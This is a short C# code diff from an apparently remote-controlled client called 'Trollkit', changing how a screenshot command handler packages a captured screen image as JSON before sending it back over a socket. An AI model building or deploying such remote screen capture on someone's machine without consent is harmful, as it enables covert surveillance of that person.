@@ -50,8 +50,8 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		{
 			try
 			{
-				string imageString = Screenshot.MakeScreenshot(monitorNumber); 
-				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ScreenshotResponse", Value = imageString };
+				ScreenshotModel screenshotObject = Screenshot.MakeScreenshot(monitorNumber); 
+				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ScreenshotResponse", Value = screenshotObject.ConvertToJson() };
 				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
 				return true;
 			}
